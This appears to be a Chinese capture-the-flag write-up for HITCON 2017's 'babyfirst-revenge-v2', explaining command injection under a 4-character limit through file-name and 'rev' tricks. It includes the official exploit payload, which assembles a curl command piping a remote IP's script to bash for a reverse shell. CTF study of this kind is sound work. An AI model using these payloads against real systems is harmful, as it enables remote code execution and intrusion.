# babyfirst-revenge-v2

> 分类：Web

## 题目描述

babyfirst-revenge 的进化版，命令长度限制改为 4 字符。

## 考察知识点

- 短命令执行（4 字符限制）
- `dir` 别名 + `*` 命令 + `rev` 逆序

## 解法

源码与前题相同，仅 `strlen <= 4`。

关键点：4 字符无法用 `ls>>_` 写入，需用逆序技巧。

1. 构造 `ls -th>g`（多一个 `h` 是为了让字母排序符合逆序要求），逆序分割为 4 个文件：

```
>dir
>sl
>g\>
>ht-
```

2. 用 `*` 命令把文件名拼接执行，用 `rev` 逆序：

```
*>v    # 把 * 的结果写入 v
>rev   # 创建 rev 文件
*v>x   # 执行 rev v>x（*v 匹配 rev 和 v，字母序 rev 在前）
```

此时 `cat x` 得到 `ls -th >g`。

3. 后续构造 curl 反弹 shell 与前题相同。

官方 exp 关键部分：

```python
payload = [
    '>dir', '>sl', '>g\>', '>ht-', '*>v',
    '>rev', '*v>x',
    '>\;\\', '>sh\\', '>ba\\', '>\|\\', '>20\\', '>2.\\',
    '>8.\\', '>18\\', '>0.\\', '>1\\', '>\ \\', '>rl\\', '>cu\\',
    'sh x', 'sh g',
]
```

## 参考答案

（flag 通过反弹 shell 后读取）

## 来源

- 作者：LoRexxar / Orange | https://lorexxar.cn/2017/11/10/hitcon2017-writeup/
- 作者：云卷云舒 | https://xz.aliyun.com/news/1371
